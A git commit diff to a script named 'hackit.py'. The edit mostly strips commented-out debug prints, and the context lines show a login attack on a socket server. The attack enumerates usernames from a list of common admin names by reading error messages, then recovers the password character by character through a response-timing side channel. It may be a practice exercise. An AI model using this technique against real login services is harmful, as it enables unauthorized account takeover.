1ac90b20adfa14f777bdb2fee86474899e5eac70
Renangi Ajay Kumar <45760349+0b111000@users.noreply.github.com>
2020-07-31 14:20:10 +0530

    Update hackit.py

--- hackit.py
+++ hackit.py
@@ -18,7 +18,7 @@ credentials = {
     "login": "",
     "password": " "
 }
-# realLogin = 'admin'
+# List of few common admin logins which are known beforehand
 logins = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1',
           'user2', 'root', 'default', 'new_user', 'some_user',
           'new_admin', 'administrator', 'Administrator', 'superuser',
@@ -39,13 +39,10 @@ for val in logins:
         if received['result'] == "Wrong login!":
             continue
         if received['result'] == "Wrong password!":
-            # credentials["login"] = val
             difference1 = end_time - start_time
             break
 Password = ""
 received = {}
-# print(credentials['login'])
-# print(difference1)
 while True:
     for ch in alpha_chars:
         credentials["password"] = Password + str(ch)
@@ -53,13 +50,11 @@ while True:
         start_time = datetime.now()
         mySocket.send(jsonString.encode('utf-8'))
         received_ = mySocket.recv(1024).decode('utf-8')
-        # print(received_ + "  ---  " + str(ch))
         end_time = datetime.now()
         received = json.loads(received_)
         if 'result' in received.keys():
             if received['result'] == "Wrong password!":
                 difference2 = end_time - start_time
-                # print(difference2)
                 if (difference2 - difference1).total_seconds() > 0.1:
                     Password += str(ch)
                     break
